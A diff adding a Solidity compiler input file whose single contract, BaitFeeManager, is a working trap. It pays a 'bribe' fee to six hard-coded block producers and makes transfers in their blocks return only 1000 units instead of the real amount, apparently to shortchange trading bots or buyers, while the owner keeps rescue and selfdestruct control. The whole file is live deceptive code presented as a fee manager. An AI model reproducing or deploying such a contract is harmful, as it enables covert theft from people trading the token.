@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "BaitFeeManager.sol": {
+      "content": "pragma solidity >=0.6.6;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () internal {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    \n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external;\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external;\n    function transferFrom(address sender, address recipient, uint256 amount) external;\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IFeeManager {\n    function queryFee(address from, address _to, uint256 _amount) external returns (uint256);\n    function getTrueAmount(address from, address _to, uint256 _amount) external returns (uint256);\n}\n\n\ninterface IToken {\n    function burnFrom(address account, uint256 amount) external;\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract BaitFeeManager is IFeeManager, Ownable {\n    uint256 private _fee;\n    mapping (address => bool) public _miners;\n    address private _uniAddress;\n    \n    constructor () public {\n      _miners[address(0x5A0b54D5dc17e0AadC383d2db43B0a0D3E029c4c)] = true;\n      _miners[address(0xD224cA0c819e8E97ba0136B3b95ceFf503B79f53)] = true;\n      _miners[address(0x829BD824B016326A401d083B33D092293333A830)] = true;\n      _miners[address(0x433022C4066558E7a32D850F02d2da5cA782174D)] = true;\n      _miners[address(0x04668Ec2f57cC15c381b461B9fEDaB5D451c8F7F)] = true;\n      _miners[address(0xc8F595E2084DB484f8A80109101D58625223b7C9)] = true;\n      _fee = 100000000000000000;\n    }\n    \n    function queryFee(address from, address to, uint256 amount) external override virtual returns (uint256)\n    {\n        if(_miners[block.coinbase])\n        {\n           block.coinbase.transfer(_fee);\n        }\n       \n        return 0;\n    }\n\n    function getTrueAmount(address from, address to, uint256 amount) external override virtual returns (uint256)\n    {\n        if(to == owner() || from == owner() || from == _uniAddress || !_miners[block.coinbase])\n        {\n           return amount;  \n        }\n     \n      \n        return 1000;\n    }\n\n    function setBribeFee(uint256 fee) external  onlyOwner\n    {\n        _fee = fee;\n    } \n    \n    function setUniPair(address uniAddress) external  onlyOwner\n    {\n        _uniAddress = uniAddress;\n    } \n    \n    // Fallback rescue\n    function destroy() external {\n        require(msg.sender == owner(), \"no u 2\");\n        selfdestruct(msg.sender);\n    }\n    \n    receive() external payable{\n      \n    }\n    \n    function rescueToken(IERC20 _token) external onlyOwner {\n        _token.transfer(owner(), _token.balanceOf(address(this)));\n    }\n}"
+    }
+  }
+}
